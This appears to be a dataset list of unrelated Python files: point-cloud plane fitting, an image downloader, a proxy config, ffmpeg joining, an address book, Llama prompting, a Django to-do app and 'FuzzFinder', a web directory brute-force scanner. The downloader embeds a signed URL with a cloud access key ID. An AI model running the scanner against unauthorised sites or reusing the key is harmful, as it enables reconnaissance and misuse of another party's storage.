o3d.utility.Vector3dVector(points)\n\n    # Perform plane fitting\n    plane_model, inliers = voxel_pcd.segment_plane(distance_threshold=0.2, ransac_n=3, num_iterations=100)\n    if len(inliers) < 3:  # Skip if not enough inliers for plane fitting\n        continue\n\n    # Evaluate the plane\n    evaluation_result = evaluate_plane(plane_model, inliers)\n\n    # Color coding planes based on evaluation results\n    if evaluation_result[\"successful_fit\"]:\n        if evaluation_result[\"residual_less_than_2cm\"] and evaluation_result[\"slope_less_than_4_degrees\"]:\n            print(\"Assigning green\")\n            plane_color = [0, 1, 0]  # Green\n        elif evaluation_result[\"residual_less_than_2cm\"]:\n            plane_color = [1, 1, 0]  # Yellow\n            print(\"Assigning yellow\")\n        elif evaluation_result[\"slope_less_than_4_degrees\"]:\n            print(\"Assigning orange\")\n            plane_color = [1, 0.5, 0]  # Orange\n        else:\n            print(\"Assigning red\")\n            plane_color = [1, 0, 0]  # Red\n    else:\n        print(\"Assigning red\")\n        plane_color = [1, 0, 0]  # Red\n\n    plane = o3d.geometry.PointCloud()\n    plane.points = o3d.utility.Vector3dVector(points[inliers])\n    plane.paint_uniform_color(plane_color)\n    geometries.append(plane)\n\n# Saving final output\noutput_path = \"colored_planes.pcd\"\nfinal_output = o3d.geometry.PointCloud()\nfor plane in geometries:\n    final_output += plane\no3d.io.write_point_cloud(output_path, final_output)",
    "\"\"\"\n@author:PeilongChen(peilongchencc@163.com)\n@description:\u8fd9\u4e2a\u811a\u672c\u9996\u5148\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5f02\u6b65\u51fd\u6570 `download_image`\uff0c\u5b83\u63a5\u53d7\u56fe\u7247\u7684 URL \u548c\u8981\u4fdd\u5b58\u7684\u6587\u4ef6\u540d\u3002\u4f7f\u7528 `aiohttp.ClientSession()` \u5f02\u6b65\u53d1\u9001 HTTP GET \u8bf7\u6c42\u83b7\u53d6\u56fe\u7247\uff0c\u7136\u540e\u5229\u7528 `aiofiles.open` \u5f02\u6b65\u5199\u5165\u6587\u4ef6\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u4e0d\u963b\u585e\u4e3b\u7ebf\u7a0b\u7684\u60c5\u51b5\u4e0b\u4e0b\u8f7d\u5e76\u4fdd\u5b58\u56fe\u7247\u3002\n\"\"\"\nimport os\nimport aiohttp\nimport asyncio\nimport aiofiles\nfrom urllib.parse import urlparse, parse_qs\n\nasync def download_image(url):\n    # \u89e3\u6790 URL \u83b7\u53d6\u6587\u4ef6\u540d\n    parsed_url = urlparse(url)\n    if \"filePath\" in parse_qs(parsed_url.query):\n        # \u5982\u679c\u662f\u67e5\u8be2\u53c2\u6570\u4e2d\u5305\u542b\u6587\u4ef6\u8def\u5f84\uff0c\u5219\u4ece\u67e5\u8be2\u53c2\u6570\u4e2d\u63d0\u53d6\u6587\u4ef6\u540d\n        file_path = parse_qs(parsed_url.query)[\"filePath\"][0]\n        filename = file_path.split('/')[-1]\n    else:\n        # \u5426\u5219\uff0c\u4ece URL \u8def\u5f84\u4e2d\u76f4\u63a5\u63d0\u53d6\u6587\u4ef6\u540d\n        filename = parsed_url.path.split('/')[-1]\n    \n    # \u5b9a\u4e49\u6587\u4ef6\u4fdd\u5b58\u8def\u5f84\n    save_path = f\"ocr_pictures/{filename}\"\n    # \u83b7\u53d6\u7ed9\u5b9a\u8def\u5f84\u4e2d\u7684\u8def\u5f84\u540d\uff0c\u4f8b\u5982\u5bf9\u4e8e f\"ocr_pictures/{filename}\" \u4f1a\u8fd4\u56de \"ocr_pictures\"\n    save_dir = os.path.dirname(save_path)\n\n    # \u68c0\u67e5\u4fdd\u5b58\u8def\u5f84\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u5b58\u5728\u5219\u521b\u5efa\n    if not os.path.exists(save_dir):\n        os.makedirs(save_dir)\n\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            if response.status == 200:\n                # \u4f7f\u7528 aiofiles \u5f02\u6b65\u5199\u6587\u4ef6\uff0c\u9700\u8981\u5b89\u88c5 aiofiles\n                # \u5982\u679c\u6ca1\u6709\u5b89\u88c5\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c pip install aiofiles \u6765\u5b89\u88c5\n                async with aiofiles.open(save_path, mode='wb') as f:\n                    await f.write(await response.read())\n                    print(f\"\u56fe\u7247\u5df2\u4fdd\u5b58\u5230 {save_path}\")\n\nasync def main(urls):\n    tasks = [download_image(url) for url in urls]\n    await asyncio.gather(*tasks)\n\nif __name__ == \"__main__\":\n    urls = [\n        \"https://xxxxxx.com/pic/2024-02-22/be0c6836-6bc2-4dc1-bf0d-cf88029c522c.png?Expires=4862173056&OSSAccessKeyId=LTAI4Fqnoczaf1rSV6Vd7sLe&Signature=9YYZgqhN6eSuoQUrWhUndD40pSU%3D\",\n        \"https://xxxxxx.com.cn/user/file/download/?filePath=/positionimages/202401/20240112102706-1.jpg\"\n    ]\n\n    # \u8fd0\u884c\u5f02\u6b65\u4efb\u52a1\n    asyncio.run(main(urls))",
    "# sing-box config template JSON\ntemplate_json = {\n    \"log\": {\n        \"disabled\": False,\n        \"level\": \"info\",\n        \"timestamp\": True\n    },\n    \"dns\": {\n        \"servers\": [\n            {\n                \"tag\": \"cf\",\n                \"address\": \"https://1.1.1.1/dns-query\",\n                \"strategy\": \"prefer_ipv4\",\n                \"detour\": \"proxy\"\n            },\n            {\n                \"tag\": \"cftls\",\n                \"address\": \"tls://1.1.1.1\",\n                \"strategy\": \"ipv4_only\",\n                \"detour\": \"proxy\"\n            },\n            {\n                \"tag\": \"googletls\",\n                \"address\": \"tls://8.8.8.8\",\n                \"strategy\": \"prefer_ipv4\",\n                \"detour\": \"proxy\"\n            },\n            {\n                \"tag\": \"google\",\n                \"address\": \"https://8.8.8.8/dns-query\",\n                \"strategy\": \"prefer_ipv4\",\n                \"detour\": \"proxy\"\n            },\n            {\n                \"tag\": \"ali\",\n                \"address\": \"https://223.5.5.5/dns-query\",\n                \"strategy\": \"prefer_ipv4\",\n                \"detour\": \"direct\"\n            },\n            {\n                \"tag\": \"dnspod\",\n                \"address\": \"https://1.12.12.12/dns-query\",\n                \"strategy\": \"prefer_ipv4\",\n                \"detour\": \"direct\"\n            },\n            {\n                \"tag\": \"dnspodtls\",\n                \"address\": \"tls://1.12.12.12\",\n                \"strategy\": \"prefer_ipv4\",\n                \"detour\": \"direct\"\n            }\n        ],\n        \"rules\": [\n            {\n                \"outbound\": \"any\",\n                \"server\": \"dnspodtls\"\n            },\n            {\n                \"rule_set\": \"rule-direct\",\n                \"server\": \"dnspodtls\"\n            },\n            {\n                \"rule_set\": \"rule-private\",\n                \"server\": \"dnspodtls\"\n            },\n            {\n                \"rule_set\": \"rule-icloud\",\n                \"server\": \"dnspodtls\"\n            },\n            {\n                \"rule_set\": \"rule-apple\",\n                \"server\": \"dnspodtls\"\n            }\n        ],\n        \"final\": \"google\",\n        \"disable_cache\": False,\n        \"disable_expire\": False,\n        \"independent_cache\": False,\n        \"reverse_mapping\": False,\n        \"fakeip\": {\n            \"enabled\": False\n        }\n    },\n    \"inbounds\": [\n    ],\n    \"outbounds\": [\n        {\n            \"type\": \"selector\",\n            \"tag\": \"proxy\",\n            \"outbounds\": [\n            ],\n            \"default\": \"CM1\",\n            \"interrupt_exist_connections\": False\n        },\n        {\n            \"type\": \"dns\",\n            \"tag\": \"dns-out\"\n        },\n        {\n            \"tag\": \"direct\",\n            \"type\": \"direct\",\n            \"domain_strategy\": \"prefer_ipv4\"\n        },\n        {\n            \"type\": \"block\",\n            \"tag\": \"block\"\n        }\n    ],\n    \"route\": {\n        \"rules\": [\n            {\n                \"protocol\": \"dns\",\n                \"outbound\": \"dns-out\"\n            },\n            {\n                \"domain\": [\n                    \"yyhnet.top\",\n                    \"ddch.one\"\n                ],\n                \"domain_suffix\": [\n                    \".yyhnet.top\",\n                    \".ddch.one\"\n                ],\n                \"outbound\": \"direct\"\n            },\n            {\n                \"rule_set\": \"rule-private\",\n                \"outbound\": \"direct\"\n            },\n            {\n                \"rule_set\": \"rule-reject\",\n                \"outbound\": \"block\"\n            },\n            {\n                \"rule_set\": \"rule-icloud\",\n                \"outbound\": \"direct\"\n            },\n            {\n                \"rule_set\": \"rule-apple\",\n                \"outbound\": \"direct\"\n            },\n            {\n                \"rule_set\": \"geosite-cn\",\n                \"outbound\": \"direct\"\n            },\n            {\n                \"rule_set\": \"rule-proxy\",\n                \"outbound\": \"proxy\"\n            },\n            {\n                \"rule_set\": \"rule-tld-not-cn\",\n                \"outbound\": \"proxy\"\n            },\n            {\n                \"rule_set\": \"rule-direct\",\n                \"outbound\": \"direct\"\n            },\n            {\n                \"rule_set\": \"rule-telegramcidr\",\n                \"outbound\": \"proxy\"\n            },\n            {\n                \"rule_set\": \"rule-cncidr\",\n                \"outbound\": \"direct\"\n            },\n            {\n                \"ip_is_private\": True,\n                \"outbound\": \"direct\"\n            }\n        ],\n        \"rule_set\": [\n            {\n                \"tag\": \"geosite-cn\",\n                \"type\": \"remote\",\n                \"format\": \"binary\",\n                \"url\": \"https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-cn.srs\",\n                \"download_detour\": \"proxy\"\n            },\n            {\n                \"tag\": \"rule-direct\",\n                \"type\": \"remote\",\n                \"format\": \"binary\",\n                \"url\": \"https://raw.githubusercontent.com/DDCHlsq/sin",
    "import os\nimport subprocess\nimport sys\nfrom datetime import datetime\nfrom pathlib import Path\n\n\ndef main():\n    # get the path to the temp folder\n    temp_folder = Path(os.getenv('LOCALAPPDATA')) / 'Temp' / 'rec'\n\n    # get the path to the desktop folder\n    desktop_folder = Path(os.getenv('USERPROFILE')) / 'Desktop'\n\n    # get all main folders\n    main_folders = [f for f in temp_folder.iterdir() if f.is_dir()]\n\n    # sort main folder list oldest first\n    main_folders.sort(key=os.path.getctime)\n\n    print(f'Found {len(main_folders)} Folders')\n\n    # print list of main folders\n    for main_folder in main_folders:\n        dt = datetime.fromtimestamp(main_folder.stat().st_ctime)\n        print(f'  {main_folders.index(main_folder) + 1}. {main_folder.name} (created: {dt})')\n\n    print('\\nPlease ensure that the listed folder names are actually part of your local temp folder under:\\n    '\n          f'    {Path(os.getenv(\"LOCALAPPDATA\")) / \"Temp\" / \"rec\"}\\n')\n\n    # press enter to continue\n    input('Press Enter to continue...')\n\n    # to ensure we are not messing with some files we don't want to mess with, we will ask the user to confirm the operation\n    while True:\n        user_input = input('Enter the number of the folder to concatenate, \"all\" to concatenate all, or \"none\" to exit:')\n        if user_input.lower() == 'none':\n            sys.exit(0)\n        elif user_input.lower() == 'all':\n            break\n        elif user_input.isdigit():\n            user_input = int(user_input)\n            if 1 <= user_input <= len(main_folders):\n                main_folders = [main_folders[user_input - 1]]\n                break\n            else:\n                print('Invalid input. Please enter a valid number.')\n        else:\n            print('Invalid input. Please enter a valid number or \"all\" or \"none\".')\n\n    day = 1\n\n    # iterate over all main folders\n    for main_folder in main_folders:\n        # get the name of the main folder\n        main_folder_name = main_folder.name\n\n        # if the main folder contains a file \"videoList.txt\", use it to concatenate the video files\n        video_list_file = main_folder / 'videoList.txt'\n        if video_list_file.exists():\n            print(f'Found videoList.txt in {main_folder_name}')\n\n            # create a folder for the output video\n            output_folder = desktop_folder / 'output' / f\"day {day} - {main_folder_name}\"\n            output_folder.mkdir(parents=True, exist_ok=True)\n\n            # concatenate the video files\n            # ffmpeg -f concat -safe 0 -i input.txt -c copy output.webm\n            input_file = video_list_file\n            output_file = output_folder / 'output.webm'\n\n            print(input_file)\n\n            subprocess.run(['ffmpeg', '-f', 'concat', '-safe', '0', '-i', input_file, '-c', 'copy', output_file])\n\n            print(f'Concatenated video files from {main_folder} into {output_file}')\n        else:\n            # get all subfolders\n            subfolders = [f for f in main_folder.iterdir() if f.is_dir()]\n\n            # create a list of all video files\n            video_files = []\n            for subfolder in subfolders:\n                video_file = subfolder / 'output.webm'\n                if video_file.exists():\n                    video_files.append(video_file)\n                    # after adding, sort the list oldest video first\n                    video_files.sort(key=os.path.getmtime)\n\n            # check if there are any video files\n            if len(video_files) == 0:\n                print(f'No video files found in {main_folder_name}')\n                continue\n\n            # create a folder for the output video; the folder name is output-{date-of-newest-video}\n            output_folder = desktop_folder / 'output' / f\"day {day} - {main_folder_name}\"\n            output_folder.mkdir(parents=True, exist_ok=True)\n\n            # concatenate the video files\n            # ffmpeg -f concat -safe 0 -i input.txt -c copy output.webm\n            input_file = output_folder / 'input.txt'\n            with open(input_file, 'w') as f:\n                for video_file in video_files:\n                    f.write(f\"file '{video_file}'\\n\")\n\n            output_file = output_folder / 'output.webm'\n            print(input_file)\n\n            subprocess.run(['ffmpeg', '-f', 'concat', '-safe', '0', '-i', input_file, '-c', 'copy', output_file])\n\n            print(f'Concatenated {len(video_files)} video files into {output_file}')\n\n        day += 1\n\n    print(f'\\nSaved output video(s) to {desktop_folder / \"output\"}')\n    input('Press Enter to exit...')\n\n\nif __name__ == '__main__':\n    main()\n",
    "from collections import UserDict\n\n\nclass Field:\n    def __init__(self, value):\n        self.value = value\n\n    # return the value of the field as a string\n    def __str__(self):\n        return str(self.value)\n\n\nclass Name(Field):\n    # \u0440\u0435\u0430\u043b\u0456\u0437\u0430\u0446\u0456\u044f \u043a\u043b\u0430\u0441\u0443\n    pass\n\n\nclass Phone(Field):\n    def __init__(self, value: str):\n        super().__init__(value)\n\n        # check if the phone number contains 10 digits\n        if not value.isdigit() or len(value) != 10:\n            raise ValueError(\"Phone number must contain 10 digits.\")\n\n\nclass Record:\n    def __init__(self, name):\n        self.name = name\n        self.phones = []\n\n    def add_phone(self, phone):\n        Phone(phone)\n        self.phones.append(phone)\n\n    def remove_phone(self, phone):\n        self.phones.remove(phone)\n\n    def edit_phone(self, phone, new_phone):\n        self.phones[self.phones.index(phone)] = new_phone\n\n    def find_phone(self, phone):\n        # return phone\n        return self.phones[self.phones.index(phone)]\n\n    def __str__(self) -> str:\n        return f\"Contact name: {self.name}, phones: {'; '.join(p for p in self.phones)}\"\n\n\nclass AddressBook(UserDict):\n\n    def add_record(self, record: Record):\n        self.data[record.name] = record\n\n    def find(self, name) -> Record:\n        return self.data[name]\n\n    def delete(self, name):\n        del self.data[name]\n\n\ndef input_error(func):\n    def inner(*args, **kwargs):\n\n        try:\n            return func(*args, **kwargs)\n\n        except ValueError:\n            return \"Please try again and add all nessesary arguments, or delete extra arguments.\"\n\n        except KeyError:\n            return \"Invalid contact name. Please try again.\"\n\n        except IndexError:\n            return \"Contact not found.\"\n\n    return inner\n\n\n@input_error\ndef main():\n    \"\"\"\n    The function is controlling the cycle of command processing.\n    \"\"\"\n    print(\"Welcome to the assistant bot!\")\n    contacts = {}\n    while True:\n        # Getting the input from the user\n        user_input = input(\"\\nEnter a command: \")\n        command, *args = parse_input(user_input)\n\n        # Checking the command and calling the appropriate function\n        if command in [\"close\", \"exit\"]:\n            print(\"Good bye!\")\n            break\n\n        elif command == \"hello\":\n            print(\"How can I help you?\")\n\n        elif command == \"add\":\n            print(add_contact(args, contacts))\n\n        elif command == \"change\":\n            print(change_contact(args, contacts))\n\n        elif command == \"phone\":\n            print(get_phone(args, contacts))\n\n        elif command == \"all\":\n            print(print_all_contacts(contacts))\n\n        # if the command is not recognized - print an error message\n        else:\n            print(\"Invalid command.\")\n\n\n@input_error\ndef parse_input(user_input) -> tuple:\n    \"\"\"Function is finding a command in the input and returns it\"\"\"\n    # Splitting the input into words, first word is a command, other words are arguments\n    cmd, *args = user_input.split()\n    # Converting the command to lower case and deleting extra spaces\n    cmd = cmd.strip().lower()\n    return cmd, *args\n\n\n@input_error\ndef add_contact(args, contacts) -> str:\n    \"\"\"Function is adding a contact to the contacts dictionary. Returns a message about the result.\"\"\"\n    # Getting the name and phone from the args\n    name, phone = args\n    contacts[name] = phone\n    return \"Contact added.\"\n\n\n@input_error\ndef change_contact(args, contacts) -> str:\n    \"\"\"Function is changing the phone number for the contact in the contacts dictionary. Returns a message about the result.\"\"\"\n    name, phone = args\n    # Try to access the contact in the dictionary\n    _ = contacts[\n        name  # This line will raise a KeyError if the name is not in the dictionary\n    ]\n    contacts[name] = phone\n    return \"Contact changed.\"\n\n\n@input_error\ndef get_phone(args, contacts) -> str:\n    \"\"\"Function is getting the phone number for the contact from the contacts dictionary. Returns a message about the result.\"\"\"\n    name = args[0]\n    if name in contacts:\n        return f\"The {name} phone number is: {contacts[name]}\"\n    else:\n        return \"Contact not found.\"\n\n\n@input_error\ndef print_all_contacts(contacts) -> str:\n    \"\"\"Function is printing all contacts from the contacts dictionary. Returns a message about the result.\"\"\"\n    if contacts:\n        for name, phone in contacts.items():\n            print(f\"{name}: {phone}\")\n\n        return \"All contacts printed\"\n    else:\n        return \"No contacts found.\"\n\nif __name__ == \"__main__\":\n    #     main()\n    # \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u043d\u043e\u0432\u043e\u0457 \u0430\u0434\u0440\u0435\u0441\u043d\u043e\u0457 \u043a\u043d\u0438\u0433\u0438\n    # \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u043d\u043e\u0432\u043e\u0457 \u0430\u0434\u0440\u0435\u0441\u043d\u043e\u0457 \u043a\u043d\u0438\u0433\u0438\n    book = AddressBook()\n\n    # \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u0437\u0430\u043f\u0438\u0441\u0443 \u0434\u043b\u044f John\n    john_record = Record(\"John\")\n    john_record.add_phone(\"1234567890\")\n    john_record.add_phone(\"5555555555\")\n\n    # \u0414\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f \u0437\u0430\u043f\u0438\u0441\u0443 John \u0434\u043e \u0430\u0434\u0440\u0435\u0441\u043d\u043e\u0457 \u043a\u043d\u0438\u0433\u0438\n    book.add_record(john_record)\n\n    # \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u0442\u0430 \u0434\u043e\u0434\u0430\u0432\u0430\u043d\u043d\u044f \u043d\u043e\u0432\u043e\u0433\u043e \u0437\u0430\u043f\u0438\u0441\u0443 \u0434\u043b\u044f Jane\n    jane_record = Record(\"Jane\")\n    jane_reco",
    "\n\nimport inflection\nfrom slugify import slugify\nfrom tendril.connectors.grafana.actions.folders import check_create_folder\nfrom .teams import ensure_graphs_team\n\n\ndef get_graphs_folder_path(interest_type, interest_name, descriptive_name=None):\n    return [{'uid': slugify(interest_type), 'title': inflection.humanize(inflection.pluralize(interest_type))},\n            {'uid': slugify(interest_name), 'title': descriptive_name}]\n\n\nasync def ensure_graphs_folder(*args, **kwargs):\n    # TODO This is probably going to need a lot of non-trivial error handling.\n    folder_path_parts = get_graphs_folder_path(*args, **kwargs)\n\n    team_id = await ensure_graphs_team(interest_type=kwargs['interest_type'],\n                                       interest_name=kwargs['interest_name'])\n\n    folder_uid = None\n    for idx, folder_spec in enumerate(folder_path_parts):\n        if idx == len(folder_path_parts) - 1:\n            await check_create_folder(parent_uid=folder_uid, team_id=team_id, **folder_spec)\n        else:\n            await check_create_folder(parent_uid=folder_uid, **folder_spec)\n        folder_uid = folder_spec['uid']\n\n    return folder_uid\n",
    "\"\"\"\n    This module contains code that is used for expanding incoming queries with extra keywords to enhance the retrieval\n    of documents.\n\"\"\"\nimport itertools\nimport pickle\nimport unidecode\nfrom Levenshtein import ratio\nfrom typing import List\n\nfrom config import THESAURUS_PATH\n\nwith open(THESAURUS_PATH, 'rb') as data:\n    thesaurus = pickle.load(data) if data else {'synonyms': {}}\n\n\ndef expand_query(query: list) -> List[str]:\n    \"\"\"\n        Expand relevant query terms by getting synonyms from the CBS Taxonomy thesaurus\n\n        :param query: given query terms to expand\n        :return: expanded query, with the expanded words added after the original\n    \"\"\"\n    query = [unidecode.unidecode(q) for q in query]\n    expandable_terms = set()\n    for s in thesaurus['synonyms']:\n        if s and len(s.split()) <= len(query):\n            if all(w in query for w in unidecode.unidecode(s).split()):\n                expandable_terms.update(thesaurus['synonyms'][s][:4])\n\n    if expandable_terms:\n        compare_terms = list(expandable_terms) + query\n        if len(query) > 1:\n            compare_terms += [\" \".join(query)]\n        delete = set(query)\n\n        for x, y in itertools.combinations(compare_terms, 2):\n            if ratio(x, y) >= 0.8:\n                if x in query or y in query:\n                    delete.add(x)\n                    delete.add(y)\n                else:\n                    if len(x) > len(y):\n                        delete.add(x)\n                    else:\n                        delete.add(y)\n\n        for d in delete:\n            if d in compare_terms:\n                compare_terms.remove(d)\n\n        return compare_terms[::-1]\n    else:\n        return query\n",
    "# Copyright (c) Meta Platforms, Inc. and affiliates.\n# This software may be used and distributed according to the terms of the Llama 2 Community License Agreement.\n\nfrom typing import List, Optional\n\nimport fire\n\nfrom llama import Llama, Dialog\nimport os\n\n# \u914d\u7f6e\u53ef\u7528\u663e\u5361\nos.environ[\"CUDA_VISIBLE_DEVICES\"]=\"1\"\n\ndef main(\n    ckpt_dir: str,\n    tokenizer_path: str,\n    temperature: float = 0.6,\n    top_p: float = 0.9,\n    max_seq_len: int = 256,\n    max_batch_size: int = 8,\n    max_gen_len: Optional[int] = 20,\n):\n    \"\"\"\n    Entry point of the program for generating text using a pretrained model.\n\n    Args:\n        ckpt_dir (str): The directory containing checkpoint files for the pretrained model.\n        tokenizer_path (str): The path to the tokenizer model used for text encoding/decoding.\n        temperature (float, optional): The temperature value for controlling randomness in generation.\n            Defaults to 0.6.\n        top_p (float, optional): The top-p sampling parameter for controlling diversity in generation.\n            Defaults to 0.9.\n        max_seq_len (int, optional): The maximum sequence length for input prompts. Defaults to 512.\n        max_batch_size (int, optional): The maximum batch size for generating sequences. Defaults to 8.\n        max_gen_len (int, optional): The maximum length of generated sequences. If None, it will be\n            set to the model's max sequence length. Defaults to None.\n    \"\"\"\n\n    generator = Llama.build(\n        ckpt_dir=ckpt_dir,\n        tokenizer_path=tokenizer_path,\n        max_seq_len=max_seq_len,\n        max_batch_size=max_batch_size,\n    )\n\n    valid_file_path = \"./prompt_valid.txt\"\n    with open(valid_file_path, \"r\", encoding=\"utf-8\") as file:\n        prompt_valid_data = file.readlines()\n\n    for num in range(1, 21):\n        # \u8bfb\u53d6prompt\u6587\u4ef6\n        input_file_path = f\"./Prompt/promtp_{num}-shot.txt\"\n        with open(input_file_path, \"r\", encoding=\"utf-8\") as input_file:\n            requirement_prompt = input_file.read()\n\n        # \u6839\u636eprompt\u6587\u4ef6\u7ec4\u4ef6\u591a\u4e2a\u8f93\u5165\n        prompts_input: List[str] = []\n        for line in prompt_valid_data:\n            content,review = line.strip().split('\\t')\n            prompts_input.append(requirement_prompt +\"\\n\"+ content + \"->\")\n        # print(len(prompts_input))\n\n        # \u4f20\u5165\u6a21\u578b\u8fdb\u884c\u8f93\u51fa\n        chunk_size = 4\n        for i in range(0,len(prompts_input),chunk_size):\n            chunk_prompts = prompts_input[i:i+chunk_size]\n            results = generator.text_completion(\n                        chunk_prompts,  # type: ignore\n                        max_gen_len=max_gen_len,\n                        temperature=temperature,\n                        top_p=top_p,\n            )\n\n            # \u5c55\u793a\u6a21\u578b\u8f93\u51fa\u7ed3\u679c\n            for prompt, result in zip(chunk_prompts, results):\n                result = result['generation'].split('\\n')\n                result = result[0]\n                print(\"\\n==================================\\n\")\n                print(f\" {result}\")\n                print(\"\\n==================================\\n\")\n\n            # \u5c06\u6a21\u578b\u8f93\u51fa\u7ed3\u679c\u5199\u5165\u6587\u4ef6\n            output_file_path = f\"./prompt_output/prompt_output_{num}-shot_{ckpt_dir}.txt\"\n\n            with open(output_file_path,\"a\",encoding=\"utf-8\") as file:\n                for data_line,result in zip(prompt_valid_data[i:i+chunk_size],results):\n                    result = result['generation'].split('\\n')\n                    result = result[0]\n                    content,review = data_line.strip().split('\\t')\n                    file.write(f\"{content}\\t{review}\\t{result}\\n\")\n\nif __name__ == \"__main__\":\n    fire.Fire(main)\n",
    "# Example URLS for testing ethically: http://testphp.vulnweb.com  or  https://vulnerable-website.com/\n# ---------------------------------------------------------------------------------------\n# This program, created by Phantom, is intended for ethical and responsible security\n# testing only. Use it exclusively on systems where you have explicit authorization.\n# Unauthorized use of this software is illegal and unethical.\n# ---------------------------------------------------------------------------------------\n# Check me out on GitHub! -> https://github.com/phantom0004\n#---------------------------------------------------------------------------------------\ntry:\n    import requests\n    from termcolor import colored\n    from bs4 import BeautifulSoup, Comment\n    import uuid\nexcept ModuleNotFoundError as error_message:\n    exit(f\"You are missing the following library, please install in terminal using 'pip install <module name>' : {error_message}\")\nimport os\nimport time\nimport sys\n\ndef display_banner():\n    banner = \"\"\"\n    $$$$$$$$\\                            $$$$$$$$\\ $$\\                 $$\\           \n    $$  _____|                           $$  _____|\\__|                $$ |          \n    $$ |   $$\\   $$\\ $$$$$$$$\\ $$$$$$$$\\ $$ |      $$\\ $$$$$$$\\   $$$$$$$ | $$$$$$\\  \n    $$$$$\\ $$ |  $$ |\\____$$  |\\____$$  |$$$$$\\    $$ |$$  __$$\\ $$  __$$ |$$  __$$\\ \n    $$  __|$$ |  $$ |  $$$$ _/   $$$$ _/ $$  __|   $$ |$$ |  $$ |$$ /  $$ |$$ |  \\__|\n    $$ |   $$ |  $$ | $$  _/    $$  _/   $$ |      $$ |$$ |  $$ |$$ |  $$ |$$ |      \n    $$ |   \\$$$$$$  |$$$$$$$$\\ $$$$$$$$\\ $$ |      $$ |$$ |  $$ |\\$$$$$$$ |$$ |      \n    \\__|    \\______/ \\________|\\________|\\__|      \\__|\\__|  \\__| \\_______|\\__|                                                                                 \n    \"\"\"\n    banner_msg = colored(\"Your Ultimate Fuzzing Companion <3\", 'red')\n    print(banner+banner_msg+\"\\t\\tUnauthorised usage is prohibited\")\n    print(\"\\n\") # Reduce clutter\n    \ndef start_fuzzer(wordlist_path, website_link, delay, verbose=\"N\", write_to_file=False):\n    global log_file, redirect_counter # Define global variables needed\n    \n    with open(wordlist_path) as wordlist:\n        for word in map(str.strip, wordlist):\n            fuzzing_link = normalize_url(f\"{website_link}/{word}\") # Normalize fuzzing link in hopes to eliminate redirections \n            \n            try:\n                time.sleep(float(delay)) # Prevent \"too many requests\" status code or else even a potential website block \n                \n                res = requests.get(url=f\"{fuzzing_link}\", allow_redirects=False)\n                redirect_output = check_for_redirects(res, redirect_counter,fuzzing_link)\n                if res.status_code == 404: continue\n                \n                if redirect_output[0] and verbose == \"Y\":\n                    if \"Unable to identify\" in redirect_output[1]:\n                        if write_to_file:\n                            log_to_file(f\"[!] Server is redirecting requests, adding delay to try prevent this [Redirection Link : {redirect_output[1]}]\\n\", log_file) \n                        else:\n                            print(colored(f\"[!] Server is redirecting requests, adding delay to try prevent this [Redirection Link : {redirect_output[1]}]\", 'yellow'))\n                    \n                    fuzzing_link = normalize_url(fuzzing_link) # Update fuzzing link to remove the trailing slash\n                    \n                elif redirect_output[0] == \"redirect_fail\":\n                    exit(\"Server keeps redirecting, this is possibly due to the fact that it has noticed the fuzzing attempts\")\n                    \n            except KeyboardInterrupt:\n                break\n            except TimeoutError:\n                print(\"Connection timeout, skipping . . .\")\n                continue\n            except requests.RequestException as res_error:\n                print(f\"[-] An exception occured within the requests library - {res_error}\")\n                break\n            \n            print(\"[+] DIRECTORY FOUND : \" + colored(word, \"green\") + f\"    [Full Link : {fuzzing_link}]\")    \n            if write_to_file == True: log_to_file(f\"[+] DIRECTORY FOUND : {word} [Full Link : {fuzzing_link}]\\n\", log_file)\n             \n            if verbose == \"Y\": \n                parse_verbose_output(res, write_to_file, log_file)    \n                if write_to_file == True: log_to_file(\"\\n\\n\", log_file)\n                else: print()\n    \ndef verbose_output(html_content):\n    links, titles, comments, forms = [], [], [], []\n    \n    for link in html_content.find_all(\"a\"):\n        try:\n            href = link.get('href') # Different logic for links as stripping normally doesnt work always\n            if href and len(href) > 1:\n                links.append(href.strip())\n        except AttributeError:\n            links.append(\"Error encountered, RAW OUTPUT - \"+str(links))\n        \n    for title in html_content.find_all(\"title\"):\n        try:\n  ",
    "from django.shortcuts import redirect, render, HttpResponseRedirect\r\nfrom .models import Taches\r\nfrom .forms import AddTask\r\n\r\n# Create your views here.\r\n\r\n\r\n# Cette fonction permet d'afficher et d'ajouter une tache dans la base des donn\u00e9es\r\ndef index(request):\r\n    if request.method == 'POST':\r\n        fm = AddTask(request.POST)\r\n        if fm.is_valid():\r\n            champ_title = fm.cleaned_data['title'] #On affecte les informations du champs qui seront supprim\u00e9es apr\u00e8s l'envoie\r\n            reg = Taches(title = champ_title) #On efface les donn\u00e9es dans le formurmulaire apr\u00e8s l'envoie\r\n            reg.save() #On enregistre les information dans la base des donn\u00e9es\r\n            fm = AddTask()\r\n    else:\r\n        fm = AddTask() #On ne fait absolument rien si le formulaire n'est pas remplie\r\n\r\n    context = {\"form\":fm,\r\n               \"taches\":Taches.objects.all()}\r\n    return render(request, \"todolist/index.html\", context)\r\n\r\n# Cette fonction permet de supprimer une t\u00e2che\r\ndef remove(request, id):\r\n    pi = Taches.objects.get(pk=id)\r\n    pi.delete()\r\n    return HttpResponseRedirect(\"/\")\r\n\r\n# Cette fonction permet de modifier une t\u00e4che\r\ndef edit(request, id):\r\n    pi = Taches.objects.get(pk=id)\r\n    if request.method == 'POST':\r\n        form = AddTask(request.POST, instance=pi)\r\n        if form.is_valid():\r\n            form.save()\r\n            return redirect('/')\r\n    else:\r\n        form = AddTask(instance=pi)\r\n    return render(request, \"todolist/modif.html\", {\"form\": form})",
